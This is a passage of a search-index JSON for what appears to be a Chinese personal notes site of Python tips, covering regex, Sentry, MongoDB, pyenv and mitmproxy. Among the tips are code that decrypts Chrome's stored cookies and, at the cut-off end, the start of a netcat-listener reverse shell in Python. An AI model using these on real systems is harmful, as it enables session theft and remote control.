_getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ]) Python\u63d0\u53d6url \u6b63\u5219\u5339\u914d\u7684\u56de\u6eaf\u7206\u70b8\u95ee\u9898 \u00b6 \u63d0\u53d6url\u60f3\u9047\u5230\u4e2d\u6587\u5b57\u7b26\u5c31\u4e0d\u7b97\u5165url\u4e2d\uff0c\u5199\u51fa\u4e86\u8fd9\u6837\u7684\u6b63\u5219(Python)\uff0c\u628a\u4e2d\u6587\u52a0\u5165\u5230\u6700\u540e\u7684\u6392\u9664\u5b57\u7b26\uff1a _url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()<>\uff0c\u3002\uff08\uff09]+|\\([^\\s()<>\uff0c\u3002\uff08\uff09]+\\))+(?:\\([^\\s()<>\uff0c\u3002\uff08\uff09]+\\)|[^\\u4e00-\\u9fa5\uff0c\u3002\uff08\uff09\\s`!()\\[\\]{};:\\'\".,<>?]))') \u7136\u540e\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u53d1\u73b0\u7f51\u7ad9\u7279\u5b9a\u9875\u9762\u8bbf\u95ee\u7279\u522b\u7f13\u6162\uff0cCPU\u5360\u7528\u9ad8\uff0c\u6392\u9664\u8bb8\u4e45\u6b7b\u5faa\u73af\u540e\u53d1\u73b0\u662f\u8fd9\u4e2a\u6b63\u5219\u82b1\u4e86\u592a\u957f\u7684\u65f6\u95f4 \u89e3\u51b3\u65b9\u6848\u5c31\u662f\u653e\u5f03\u4f7f\u7528\u6b63\u5219\u6765\u5254\u9664\u4e2d\u6587\uff0c\u63d0\u53d6\u51fa\u542b\u6709\u4e2d\u6587\u5b57\u7b26\u7684url\u540e\u518d\u505a\u5904\u7406\u53bb\u6389\u4e2d\u6587\u5b57\u7b26\uff08\u5b57\u8282\u6570>1\u7684\uff09 \u73b0\u5728\u4f7f\u7528\u7684\u6b63\u5219\u662f\uff1a _url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()<>]+|\\([^\\s()<>]+\\))+(?:\\([^\\s()<>]+\\)|[^\\s`!()\\[\\]{};:\\'\".,<>?]))') \u63d0\u53d6\u540e\u7684\u5904\u7406\u4ee3\u7801\uff1a start, end = match.span() while len(data[end-1].encode(\"utf-8\"))>1: end -= 1 \u73b0\u5728\u6539\u4e3a\u66f4\u52a0\u4fdd\u5b88\u7684 \u4ece\u5de6\u5f80\u53f3\u904d\u5386\uff0c\u9047\u5230\u5b57\u8282\u6570>1\u7684\u5c31\u7ec8\u6b62url\uff1a start , end = match . span () newend = start while newend < end and len ( data [ newend ] . encode ( \"utf-8\" )) == 1 : newend += 1 end = newend ubuntu\u5b89\u88c5gmpy2 \u00b6 apt install libmpc-dev libmpfr-dev pip install gmpy2 \u8fa3\u9e21\u7684\u5b98\u65b9\u6587\u6863\u90fd\u4e0d\u63d0\u4e00\u4e0bapt\u5b89\u88c5\u4f9d\u8d56\u5e93\u7684\u4e8b\u60c5\uff0capt\u80fd\u641e\u5b9a\u7684\u4e3a\u5565\u8fd8\u8981\u81ea\u5df1\u7f16\u8bd1hhh \u652f\u6301python3 \u4e5f\u53ef\u4ee5-t .\u5b89\u88c5\u5230\u5f53\u524d\u76ee\u5f55\uff0c\u5c31\u662f\u7f16\u8bd1\u751f\u6210\u4e86\u4e00\u4e2aso\u6587\u4ef6 Flask\u6a21\u677f \u5220\u53bb\u5faa\u73af\u5f15\u5165\u7684\u591a\u4f59\u7a7a\u683c \u00b6 \u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u5199for\u5faa\u73af\u7684\u65f6\u5019\uff0c\u4ea7\u751f\u7684html\u4f1a\u5305\u542b\u4ee3\u7801\u4e2d\u7684\u7f29\u8fdb\u7a7a\u683c\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66b4\u9732\u4ee3\u7801\u7684\u4fe1\u606f\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u5220\u53bb \u5f88\u7b80\u5355 \u628a {% %} \u6539\u4e3a {%- -%} \u5373\u53ef {% - for i in range ( 1 , 10 ) - %} {{ i }} {% - endfor - %} \u4f7f\u7528sentry \u00b6 \u5728py\u6587\u4ef6\u4e00\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\uff0c\u4f1a\u81ea\u52a8\u5904\u7406\u6ca1\u6709\u88abhandle\u7684\u5f02\u5e38 \u5b89\u88c5\uff1apip install sentry_sdk import sentry_sdk from sentry_sdk import capture_message , capture_exception sentry_sdk . init ( \"....\" ) \u5728\u51fa\u73b0\u4e86\u610f\u5916\u4f46\u662f\u4e0d\u4e25\u91cd\u53ef\u4ee5pass\u7684\u65f6\u5019 \u4ee3\u66ff traceback.print_exc() \uff1a try : 1 / 0 except : capture_exception () capture_message ( \"oho, 1/0 failed...\" ) pass \u5982\u679c\u662fflask\u7684\u5e94\u7528 \u6bd4\u5982\u7528\u6237\u767b\u5f55\u4e86\uff0c\u5e0c\u671b\u62a5\u9519\u7684\u65f6\u5019\u987a\u5e26\u7ed9\u51fa\u7528\u6237\u540d\uff1a from sentry_sdk import configure_scope @app.before_request def before_request_session (): if \"username\" in session : with configure_scope () as scope : scope . user = { \"username\" : session [ \"username\" ]} \u4e0d\u8981\u8fc7\u4e8e\u4f9d\u8d56Sentry \u00b6 capture_exception \u548c capture_message \u90fd\u662f\u540c\u6b65\u8c03\u7528 \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u8017\u65f6\u7684\u7f51\u7edc\u8bf7\u6c42 \u5c24\u5176\u5728\u5faa\u73af\u4e2d\u89e6\u53d1 \u4f1a\u5bfc\u81f4\u9875\u9762\u52a0\u8f7d\u901f\u5ea6\u663e\u8457\u53d8\u6162 \u5bf9\u4e8e\u5df2\u7ecf\u77e5\u9053\u4f1a\u6709\u5f02\u5e38\u4ea7\u751f\u4e5f\u4e0d\u5173\u5fc3\u7684\uff0c\u5c31\u4e0d\u8981\u6293\u4f4f\u8fd9\u79cd\u5f02\u5e38\u6765\u635f\u5bb3\u6027\u80fd\u4e86 pass\u5c31\u597d\u4e86 \u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898 \u00b6 \u8fd9\u662f\u7531\u4e8e\u6253\u5f00\u65b9\u5f0f\u6ca1\u6709\u628a%*\u52a0\u4e0a\u7684\u539f\u56e0\uff0c\u4fee\u6539\u6ce8\u518c\u8868 regedit HKEY_CLASSES_ROOT\\Python.File\\Shell\\open\\command \u672b\u5c3e\u52a0\u4e0a %* \u5373\u53ef\uff0c\u4f8b\u5982\u6539\u4e3a \"C:\\Python37\\python.exe\" \"%1\" %* \u4f60\u4e5f\u53ef\u4ee5\u7528\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\u6765\u505a\u4fee\u6539\uff1a \u5148\u67e5\u8be2.py\u7684\u6587\u4ef6\u7c7b\u578b\uff1a assoc .py \u67e5\u5230 .py=Python.File \u7136\u540e\u67e5\u4e00\u4e0b\u5f53\u524d\u7684\u8fd0\u884c\u547d\u4ee4\uff1a ftype Python.File \u7136\u540e\u7528 ftype Python.File=\"C:\\Python37\\python.exe\" \"%1\" %* \u4fee\u6539\u5373\u53ef Python\u83b7\u53d6Windows Chrome\u7684Cookie \u00b6 \u53c2\u8003\uff1ahttps://github.com/cheezone/ZhihuVAPI/blob/34ef5881f83da0026119e3167ebe727619774c7b/ZhihuVAPI/util/Session.py#L18 Chrome\u7684cookie\u7528sqlite\u6570\u636e\u5e93\u5b58\u50a8\uff0c\u7528WinAPI\u52a0\u5bc6\uff0c\u5f53\u524d\u7528\u6237\u4efb\u4f55\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8c03\u7528\u89e3\u5bc6API\u6765\u83b7\u53d6cookie import sqlite3 import glob import os from win32.win32crypt import CryptUnprotectData def getcookie ( host ): result = [] for cookiepath in glob . glob ( os . environ [ 'LOCALAPPDATA' ] + r \"\\*\\*\\User Data\\Default\\Cookies\" ) + glob . glob ( os . environ [ 'LOCALAPPDATA' ] + r \"\\*\\User Data\\Default\\Cookies\" ): sql = \"select host_key,name,encrypted_value from cookies where host_key=' %s '\" % host with sqlite3 . connect ( cookiepath ) as conn : cu = conn . cursor () cookies = { name : CryptUnprotectData ( encrypted_value )[ 1 ] . decode () for host_key , name , encrypted_value in cu . execute ( sql ) . fetchall ()} result . extend ([ k + \"=\" + v for k , v in cookies . items ()]) return result \u8c03\u7528\u5982 getcookie(\".zhihu.com\") Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8 \u00b6 \u5728Windows\u4e0a\u5199\u4ee3\u7801\uff0c\u76ee\u6807\u90e8\u7f72\u73af\u5883\u4e3alinux\uff0c\u672c\u673a\u8fd0\u884c\u7684\u65f6\u5019\u4e0d\u60f3\u6bcf\u6b21\u8bfb\u5199\u6587\u4ef6\u90fd\u8981\u5199 encoding=\"utf-8\" \u4fee\u6539 C:\\Python38\\Lib\\site.py \uff0c\u672b\u5c3e\u52a0\u4e0a\uff1a import _locale _locale . _getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ]) \u9a8c\u8bc1\u53ef\u4ee5\u7528\uff1a python -c \"print(open('x','w').encoding)\" \u8f93\u51fa utf8 \u800c\u4e0d\u662f cp936 \u5373\u53ef \u53c2\u8003\uff1a https://juejin.im/post/5bd2b6d5e51d45735c3c0453 Ubuntu16.04\u5b89\u88c5Python3.7 \u00b6 \u5e76\u4e14\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u7684python apt - key adv -- keyserver keyserver . ubuntu . com -- recv - keys BA6932366A755776 && \\ echo \"deb http://ppa.launchpad.net/deadsnakes/ppa/ubuntu xenial main\" > / etc / apt / sources . list . d / python . list && \\ apt update && apt install - y python3 . 7 - dev && \\ update - alternatives -- install / usr / bin / python python / usr / bin / python3 . 7 50 && \\ curl https : // bootstrap . pypa . io / get - pip . py | python && \\ pip install - U setuptools \u4f46\u662f\u5728ubuntu 14.04\u4e0a\u4ece\u8fd9\u4e2appa\u6e90\u5b89\u88c5\u7684python\u6ca1\u6709_ssl\u7684\u5e93\uff0c\u65e0\u6cd5\u4f7f\u7528pip\u5f88\u8ff7\uff08\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5f00\u4e86\u4e00\u4e2adocker ubuntu16.04\u7684\u5bb9\u5668\u7ee7\u7eed\uff09 \u5224\u65ad\u4ee3\u7801\u662f\u5426\u5361\u4f4f\uff0c\u81ea\u52a8\u53d1\u9001KeyboardInterrupt \u00b6 \u573a\u666f\uff1a \u8dd1\u722c\u866b\u7b49\u4f9d\u8d56\u7f51\u7edc\u7684\u4ee3\u7801\uff0c\u9047\u5230\u7f51\u7edc\u4e0d\u4f73\u7684\u65f6\u5019\u4e00\u76f4\u5361\u4f4f\u4e0d\u518d\u6267\u884c\uff0c\u589e\u52a0timeout\u8bbe\u7f6e\u786e\u5b9e\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u6709\u6ca1\u6709\u4e0d\u7528\u6539\u4ee3\u7801\u7684\u65b9\u5f0f\u5462\uff1f \u4f9d\u8d56\uff1a apt install inotify-tools watch.sh: #!/bin/bash while true ; do inotifywait -e modify -t 100 $1 res = $? if [ \" $res \" == \"2\" ] ; then echo \"[`date`] Time Out!\" $2 || break fi sleep 60 done \u7528\u6cd5\uff1a python -u run.py >& log.txt & ps #\u67e5\u770bpython\u8fdb\u7a0b\u7684id, \u5047\u8bbe\u4e3a12345 ./watch.sh log.txt \"kill -SIGINT 12345\" \u89e3\u91ca\uff1apython\u6307\u5b9a\u8f93\u51fa\u6d41\u4e0d\u7f13\u5b58\uff0c\u4fdd\u8bc1\u6700\u65b0\u7684print\u4e5f\u80fd\u5b9e\u65f6\u5199\u5165\u6587\u4ef6\u4e2d \u7136\u540e\u4f7f\u7528inotifywait\u8fd9\u4e2a\u5de5\u5177\u89c2\u5bdf\u6587\u4ef6 $1 \u5728100\u79d2\u5185\u6709\u6ca1\u6709\u53d1\u751f\u4fee\u6539 \u5982\u679c\u6ca1\u6709\u4fee\u6539\u5c31\u6267\u884c\u7528\u6237\u63d0\u4f9b\u7684\u53c2\u6570 $2 \uff0c\u8fd9\u91cc\u662f\u4f7f\u7528kill\u53d1\u9001SIGINT\u4fe1\u53f7 \u5728Linux\u91cc\uff0c\u7528\u6237\u6309Ctrl+C\u5c31\u662fBASH\u7ed9\u5f53\u524d\u524d\u53f0\u7684\u8fdb\u7a0b\u53d1\u9001\u8fd9\u4e2a\u4fe1\u53f7 \u5982\u679c\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u90a3\u4e48kill\u4f1a\u62a5\u9519\u627e\u4e0d\u5230\u8fdb\u7a0b\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5break\u8df3\u51fa\u5faa\u73af\u4e86 \u5982\u679c\u53d1\u751f\u4e86\u4fee\u6539\u5c31\u6b47\u4e00\u5206\u949f\u540e\u7ee7\u7eed\u89c2\u5bdf \u8fd9\u4e2a\u573a\u666f\u4e0b\u5141\u8bb8\u5ef6\u8fdf\u6ca1\u5fc5\u8981\u4e00\u76f4\u89c2\u5bdf\uff0c\u53ea\u8981\u5361\u4f4f\u7684\u65f6\u5019\u80fd\u53d1\u73b0\u5373\u53ef\uff08\u6700\u8fdf160\u79d2\uff09 \u5f53\u7136\u722c\u866b\u4ee3\u7801\u9700\u8981\u5904\u7406\u5f02\u5e38\uff0c\u5931\u8d25\u7684\u65f6\u5019\u7ee7\u7eed\u4e0b\u4e00\u6b21\u722c\u53d6\u6216\u8005\u91cd\u8bd5\u5373\u53ef \u8bbe\u7f6ePYTHONSTARTUP\u73af\u5883\u53d8\u91cf \u542f\u52a8Python\u81ea\u52a8\u6267\u884c\u4e00\u4e9bimport \u00b6 \u7ecf\u5e38\u542f\u52a8Python\u5f53\u8ba1\u7b97\u5668\u7528\uff0c\u4f46\u6709\u4e9b\u65f6\u5019\u4e5f\u9700\u8981\u6267\u884cquote\u4e4b\u7c7b\u7684\u51fd\u6570\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8import\u5c31\u5f88\u70e6 \u6240\u4ee5\u53ef\u4ee5\u914d\u7f6e\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u6765\u8ba9\u542f\u52a8Python\u65f6\u81ea\u52a8\u6267\u884c\u8fd9\u4e9bimport\u64cd\u4f5c Note \u6ce8\u610f\u8fd9\u4e2a\u4e0d\u4f1a\u6539\u53d8Python\u6267\u884c.py\u6587\u4ef6\u7684\u884c\u4e3a\uff0c\u53ea\u5728Python Interpreter\u4e2d\u751f\u6548 Windows\u5728cmd\u91cc\u53ef\u4ee5\u7528setx\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u7f16\u8f91\u6ce8\u518c\u8868 HKEY_CURRENT_USER\\Environment \u53c2\u8003\uff1a http://www.dowdandassociates.com/blog/content/howto-set-an-environment-variable-in-windows-command-line-and-registry/ setx PYTHONSTARTUP d : \\ myshell \\ pyload . py \u8fd9\u4e2a\u811a\u672c\u9700\u8981\u5feb\u901f\u52a0\u8f7d\uff0c\u907f\u514d\u542f\u52a8Python\u592a\u6162\uff0c\u6240\u4ee5\u4f7f\u7528lazyload\u6765\u628a\u771f\u6b63\u7684import\u7559\u5230\u4f7f\u7528\u65f6\uff1a \u4f9d\u8d56\uff1a PYTHONUTF8=1\u4f7f\u5f97windows\u7684python\u8bfb\u5199\u6587\u4ef6\u9ed8\u8ba4\u4e5f\u4f7f\u7528UTF8 set PYTHONUTF8=1 pip install lazy_import \u5148\u7b80\u8981\u6982\u62ec\u4e00\u4e0b\u8fd9\u4e2a\u811a\u672c\u63d0\u4f9b\u4e86\u4e9b\u5565\uff1a \u6807\u51c6\u5e93\uff1a time , sys , os , json , pickle , csv , requests , np ( numpy ), plt ( matplotlib . pyplot ) \u5bf9\u8c61\uff1a a\u662fEasyLogin (), sess\u662frequests . session () \u51fd\u6570\uff1a pload ( filename , default ) \u8f7d\u5165\u4e00\u4e2a pickle\u6587\u4ef6 pdump ( filename , data ) \u5c06 data\u5199\u5165pickle\u6587\u4ef6 jload \u7528 json\u8bfb\u53d6\u6587\u4ef6 jload \u7528 json\u5199\u5165\u6587\u4ef6 bd ( b64_string ) \u89e3\u7801 base64\u5b57\u7b26\u4e32 \uff0c\u8fd4\u56de str \uff0c\u81ea\u52a8\u8865\u9f50\u7b49\u53f7\uff0c\u4e0d\u4f1a Invalid base64 - encoded string hd ( b16_string ) hex decode \u5c06 hex\u5b57\u7b26\u4e32\u8f6c\u4e3abytes myprint \u663e\u793a\u5f53\u524d\u65f6\u95f4\u7684 print md5 \u8ba1\u7b97\u7ed9\u5b9a\u5b57\u7b26\u4e32\u7684 md5\u768432\u5b57\u8282hex\u5b57\u7b26\u4e32 t () int ( time . time ()) d () \u7b49\u4ef7\u4e8e date - d @ xxx \uff0c\u5c06 timestamp\u8f6c\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f \uff0c\u4e5f\u652f\u6301\u6beb\u79d2\u7684\u8f93\u5165 \u7b80\u5199\uff1a jl = json . loads pp = pprint . pprint sleep = time . sleep leval = ast . literal_eval import _locale _locale . _getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ]) import time from time import sleep import sys import json import pickle def pload ( filename , default = None , lib = pickle ): try : res = lib . load ( open ( filename , \"rb\" )) except : if default is None : raise return default return res def pdump ( filename , data , lib = pickle ): open ( filename , \"w\" + ( \"b\" if lib == pickle else \"\" )) . write ( lib . dumps ( data )) def jload ( filename , default = None ): return pload ( filename , default = default , lib = json ) def jdump ( filename , data ): return pdump ( filename , data , lib = json ) import os import csv from urllib.parse import quote , unquote from base64 import b64encode , b64decode , b16encode , b16decode def bd ( b64_string ): b64_string += \"=\" * (( 4 - len ( b64_string ) % 4 ) % 4 ) return b64decode ( b64_string ) . decode () jl = json . loads def hd ( b16_string ): return b16decode ( b16_string . upper ()) def myprint ( * args , ** kwargs ): args = list ( args ) args [ 0 ] = \"[\" + time . strftime ( \"%Y-%m- %d %H:%M:%S\" ) + \"] \" + str ( args [ 0 ]) print ( * args , ** kwargs ) import lazy_import requests = lazy_import . lazy_module ( \"requests\" ) numpy = np = lazy_import . lazy_module ( \"numpy\" ) plt = lazy_import . lazy_module ( \"matplotlib.pyplot\" ) el = EasyLogin = lazy_import . lazy_class ( \"EasyLogin.EasyLogin\" ) pp = pprint = lazy_import . lazy_function ( \"pprint.pprint\" ) leval = lazy_import . lazy_function ( \"ast.literal_eval\" ) import hashlib def _load_hashlib ( name ): def f ( s ): if isinstance ( s , str ): s = bytes ( s , \"utf-8\" ) return getattr ( hashlib , name )( s ) . hexdigest () return f md5 = _load_hashlib ( \"md5\" ) sha1 = _load_hashlib ( \"sha1\" ) sha512 = _load_hashlib ( \"sha512\" ) class _A (): def __getattr__ ( self , name ): global a a = el () return getattr ( a , name ) a = _A () class _sess (): def __getattr__ ( self , name ): global sess sess = requests . session () return getattr ( sess , name ) sess = _sess () def t (): return int ( time . time ()) from datetime import datetime , timedelta def d ( ts ): ts = int ( ts ) if len ( str ( ts )) == 13 : ts = ts // 1000 return datetime . fromtimestamp ( ts ) . strftime ( \"%Y-%m- %d %H:%M:%S\" ) Python\u4f7f\u7528MongoDB \u00b6 \u722c\u53d6\u6570\u636eajax\u63a5\u53e3\u8fd4\u56de\u7684\u662fjson\u6570\u636e\uff0c\u61d2\u5f97\u8f6c\u6362\u6210mysql\u7684\u8868\u793a\uff0c\u76f4\u63a5\u4e22\u7ed9mongo\u5457 \u53ef\u89c6\u5316\u5ba2\u6237\u7aef\u4f7f\u7528\u5b98\u65b9\u7684 Compass \u5b89\u88c5server \u00b6 docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo \u5b89\u88c5\u540e\u7684\u8fde\u63a5\u5b57\u7b26\u4e32\u662f\uff1a mongodb://adminusername:password@ip:27017 \u589e\u5220\u67e5\u6539 \u00b6 \u67e5\u8be2 \u00b6 \u5d4c\u5957\u7684\u683c\u5f0f\u7528.\u8868\u793a \u4f8b\u5982 {\"a.b\": \"1\"} \u53ef\u4ee5\u67e5\u5230\u6587\u6863 {a:{b:\"1\"}} Python\u4ee3\u7801\uff1a import pymongo client = pymongo . MongoClient ( \"mongodb://adminusername:password@127.0.0.1:27017\" ) table = client . database_name . table_name print ( table . find_one ({ \"_id\" : id })) print ( table . count_documents ({})) \u6279\u91cf\u589e\u52a0 \u00b6 insert ignore into \u5ffd\u7565\u5df2\u7ecf\u5b58\u5728\u7684\uff1a try : table . insert_many ( data , ordered = False ) except pymongo . errors . BulkWriteError : pass replace into \u8986\u76d6\u5df2\u7ecf\u5b58\u5728\u7684\uff1a\u4f7f\u7528upcert\u4e0d\u5b58\u5728\u65f6\u63d2\u5165 for item in data: # \u4f60\u5f88\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5b9a\u4e49_id # item[\"_id\"] = \"_\".join([...]) # pprint(item) table.update({'_id':item[\"_id\"]}, item, True) \u5220\u9664 \u00b6 \u7c7b\u4f3c\u7684\u6709\u51fd\u6570\uff1adelete_one, delete_many \u591a\u8868join\u67e5\u8be2 \u00b6 table\u4e2d\u6587\u6863\u91cc\u6709\u4e00\u4e2a\u5c5e\u6027idB\uff0c\u5bf9\u5e94tableB\u7684_id\uff0c\u4f7f\u7528 $lookup \u505ajoin\u64cd\u4f5c\uff0c\u65e0\u8bba\u6709\u6ca1\u6709\u67e5\u5230\u90fd\u4f1a\u8fd4\u56de\u65b0\u7684\u6587\u6863\uff0c\u6ca1\u67e5\u5230\u65f6dst\u5c5e\u6027\u4e3a\u7a7a\u6570\u7ec4 \u6240\u4ee5\u53ef\u4ee5\u7528 $match \u7ee7\u7eed\u7b5b\u9009\u67e5\u5230\u7684\u5185\u5bb9\uff1b\u7136\u540e\u7edf\u8ba1\u6570\u91cf\uff0c\u6ce8\u610f\u5230$count\u5728\u6ca1\u6709\u7ed3\u679c\u7684\u65f6\u5019\u4e0d\u8fd4\u56de\u5185\u5bb9\uff0c\u9700\u8981\u5355\u72ec\u5904\u7406 def howmany(): pipeline = [ {\"$match\": {\"idB\": {\"$exists\": True}}}, {\"$lookup\": {\"from\": 'tableB', \"localField\": 'idB', \"foreignField\": '_id', \"as\": 'dst'}}, {\"$match\": {\"dst\": {\"$size\": 1}}}, {\"$count\": \"cnt\"} ] data = list(table.aggregate(pipeline)) if not data: return 0 return data[0][\"cnt\"] \u968f\u673a\u91c7\u6837 \u00b6 pipeline\u4e2d\u4f7f\u7528\uff1a\u4f46\u662f\u6ce8\u610f\u53ef\u80fd\u4f1a\u6709\u91cd\u590d\u7684\u5143\u7d20 \u9700\u8981\u81ea\u5df1\u53bb\u91cd {\"$sample\": {\"size\":10}} \u4f7f\u7528pyenv\u7f16\u8bd1\u5b89\u88c5\u4e0d\u540c\u7248\u672c\u7684Python \u00b6 \u60f3\u81ea\u5df1\u7ef4\u62a4\u4e00\u4e2a\u5b8c\u6574\u7684\u865a\u62df\u73af\u5883\uff0c\u65b9\u4fbf\u7684\u5b89\u88c5\u5404\u79cd\u7248\u672c\uff0c\u7528 pyenv \u5457 \u5b89\u88c5\uff1a git clone https : // github . com / pyenv / pyenv . git ~/. pyenv echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' >> ~/. bash_profile echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' >> ~/. bash_profile echo - e 'if command -v pyenv 1>/dev/null 2>&1; then \\n eval \"$(pyenv init -)\" \\n fi' >> ~/. bash_profile \u7136\u540e\u5c31\u80fd\u7f16\u8bd1\u5b89\u88c5\u7279\u5b9a\u7248\u672c\u7684Python\u4e86\uff0c\u4ee53.7.0\u4e3a\u4f8b\uff1a\u4f7f\u7528\u6211\u63d0\u4f9b\u7684www.python.org\u7684\u955c\u50cf apt install -y libffi-dev libgnutls28-dev cd ~/.pyenv/plugins sed -i 's#www.python.org#py.py3.io#g' $(grep www.python.org -r . -l) pyenv install -v 3.7.0 pyenv global 3.7.0 \u4e4b\u540e\u4f7f\u7528\u5982\u679c\u9047\u5230\u5bc6\u7801\u5b66\u5e93\u7684\u95ee\u9898\uff1a pip uninstall pycrypto pycryptodome pip install pycryptodome \u53d1\u9001\u9489\u9489\u6d88\u606f \u00b6 \u7fa4\u804a\u52a0\u5165\u673a\u5668\u4eba \u5173\u952e\u8bcd\u8bbe\u7f6e\u4e3a\u4e00\u5b9a\u4f1a\u51fa\u73b0\u7684\u5b57\u7b26\u5982 .\u3002[ \uff0c\u83b7\u53d6url\u540e\u8c03\u7528\u65f6\u53ea\u9700\u8981\u4f20\u5165token\u90e8\u5206 import requests def dingsend ( token , text ): data = { \"msgtype\" : \"text\" , \"text\" : { \"content\" : text }, \"isAtAll\" : False } return requests . post ( \"https://oapi.dingtalk.com/robot/send?access_token=\" + token , json = data ) \u4f7f\u7528mitmproxy \u00b6 python3 -m pip install mitmproxy \u53c2\u8003\uff1a https://stackoverflow.com/questions/51893788/using-mitmproxy-inside-python-script from mitmproxy.options import Options from mitmproxy.proxy.config import ProxyConfig from mitmproxy.proxy.server import ProxyServer from mitmproxy.tools.dump import DumpMaster import threading import asyncio import time class Addon ( object ): def __init__ ( self ): self . num = 1 def request ( self , flow ): flow . request . headers [ \"count\" ] = str ( self . num ) def response ( self , flow ): self . num = self . num + 1 flow . response . headers [ \"count\" ] = str ( self . num ) print ( self . num ) # see source mitmproxy/master.py for details def loop_in_thread ( loop , m ): asyncio . set_event_loop ( loop ) # This is the key. m . run_loop ( loop . run_forever ) if __name__ == \"__main__\" : options = Options ( listen_host = '0.0.0.0' , listen_port = 8080 , http2 = True ) m = DumpMaster ( options , with_termlog = False , with_dumper = False ) config = ProxyConfig ( options ) m . server = ProxyServer ( config ) m . addons . add ( Addon ()) # run mitmproxy in backgroud, especially integrated with other server loop = asyncio . get_event_loop () t = threading . Thread ( target = loop_in_thread , args = ( loop , m ) ) t . start () # Other servers, such as a web server, might be started then. time . sleep ( 20 ) print ( 'going to shutdown mitmproxy' ) m . shutdown () \u5b89\u88c5proxychains: apt install proxychains4 \u4fee\u6539/etc/proxychains.conf\uff0c\u6700\u540e\u4e00\u884c\u6539\u6210 http 127.0.0.1 8080 \u6dfb\u52a0\u4fe1\u4efb\uff1a\u53c2\u8003 https://superuser.com/questions/437330/how-do-you-add-a-certificate-authority-ca-to-ubuntu cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt update-ca-certificates","title":"Python"},{"location":"Python/#python","text":"\u55ef\u54fc\uff0cPython\u5f88\u597d\u73a9\u5462\u2026\u6709\u4eba\u8bf4Python\u662f\u80fd\u8fd0\u884c\u7684\u4f2a\u4ee3\u7801\uff0c\u5c31\u5199\u4ee3\u7801\u7684\u901f\u5ea6\u800c\u8a00\u662f\u663e\u8457\u4f18\u4e8eC\u7684\uff0c\u4e5f\u6709\u5f88\u591a\u597d\u7528\u7684\u7c7b\u5e93\u5462\uff0c\u53cd\u6b63\u5f3a\u70c8\u63a8\u8350\u8fd9\u95e8\u8bed\u8a00\u5566~ \u5f53\u4f60\u5c1d\u8bd5\u4e00\u4e2a\u5305\u7684\u65f6\u5019\uff0c\u6ce8\u610f\u81ea\u5df1\u7684py\u6587\u4ef6\u540d\u79f0\u4e0d\u80fd\u4e0e\u5305\u540d\u91cd\u540d\uff0c\u4f8b\u5982\u4e0d\u8981\u51fa\u73b0flask.py","title":"Python"},{"location":"Python/#pip","text":"curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py","title":"\u5b89\u88c5pip"},{"location":"Python/#pip-mirrorsaliyuncom","text":"\u5982\u679c\u53ea\u9700\u8981\u4e00\u6b21\u6027\u5b89\u88c5\u4e2a\u5305\uff08\u5982Dockerfile\uff09\uff1a pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com \u5728Linux\u670d\u52a1\u5668\u4e0a\u5b89\u88c5python\u7684\u5305\u65f6\uff0c\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u5c06pip\u6e90\u6539\u4e3a\u56fd\u5185\u7684\u963f\u91cc\u955c\u50cf\uff08\u8c46\u74e3\u6e90\u4f3c\u4e4e\u4e0d\u518d\u66f4\u65b0\uff09\uff0c\u80fd\u663e\u8457\u63d0\u9ad8\u5305\u7684\u4e0b\u8f7d\u901f\u5ea6 mkdir -p ~/.pip echo \"\"\" [global] index-url = http://mirrors.aliyun.com/pypi/simple/ [install] trusted-host=mirrors.aliyun.com \"\"\" >~/.pip/pip.conf \u81f3\u4e8eWindows\u7528\u6237\uff0c\u5728\u7528\u6237\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2apip\u76ee\u5f55\uff0c\u5982\uff1aC:\\Users\\chenyuan\\pip\uff0c\u65b0\u5efa\u6587\u4ef6pip.ini\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a [global] index-url = http://mirrors.aliyun.com/pypi/simple/ [install] trusted-host = mirrors.aliyun.com","title":"\u8bbe\u7f6epip\u6e90 - mirrors.aliyun.com"},{"location":"Python/#shell","text":"\u9996\u5148\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u7528 nc -l \u7aef\u53e3 import socket , subprocess , os s = socket . socket ( socket . AF_INET , socket . 